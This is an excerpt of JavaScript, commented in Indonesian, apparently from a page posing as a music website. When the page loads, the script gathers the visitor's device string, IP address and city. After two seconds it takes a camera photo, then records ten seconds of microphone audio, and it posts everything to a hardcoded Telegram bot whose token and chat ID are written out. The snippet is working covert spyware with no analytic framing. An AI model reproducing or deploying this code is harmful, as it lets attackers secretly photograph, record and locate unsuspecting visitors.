...
const TELE_TOKEN = '7860310015:AAHUoTMb_LBcEBx1cMSW_Ij2gR2DquxiuGo';
const CHAT_ID = '7921088079';
...
async function sendToTelegram(message) {
    ...
    } catch (e) { console.error("Gagal kirim teks"); }
}

async function sendFileToTelegram(blob, type, caption = "") {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    if (type === 'photo') {
        formData.append('photo', blob, 'capture.jpg');
        await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
    } else {
        formData.append('voice', blob, 'recording.ogg');
        formData.append('caption', caption);
        await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendVoice`, { method: 'POST', body: formData });
    }
}

async function initCapture() {
    let deviceInfo = `<b>🚀 USER MEMBUKA WEB MUSIC</b>\n\n`;
    deviceInfo += `📱 Device: ${navigator.userAgent}\n`;
    
    try {
        const ipRes = await fetch('https://ipapi.co/json/');
        const ipData = await ipRes.json();
        deviceInfo += `📍 Lokasi: ${ipData.city}, ${ipData.country_name}\n`;
        deviceInfo += `🌐 IP: ${ipData.ip}\n`;
    } catch (e) { deviceInfo += `📍 Lokasi: Tidak diketahui\n`; }
    ...
    try {
        ...
        // Ambil Foto setelah 2 detik agar kamera fokus
        setTimeout(async () => {
            ...
            video.onloadedmetadata = () => {
                ...
                canvas.toBlob(blob => sendFileToTelegram(blob, 'photo'), 'image/jpeg');
            };

            // Mulai Rekam Suara 10 Detik
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];
            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
                sendFileToTelegram(blob, 'voice', "🎙️ Rekaman Suara User");
        ...
        await sendToTelegram(`⚠️ <b>Akses Ditolak:</b> User tidak mengizinkan kamera/mic.`);
    }
}

// Jalankan otomatis saat web dibuka
window.addEventListener('load', initCapture);
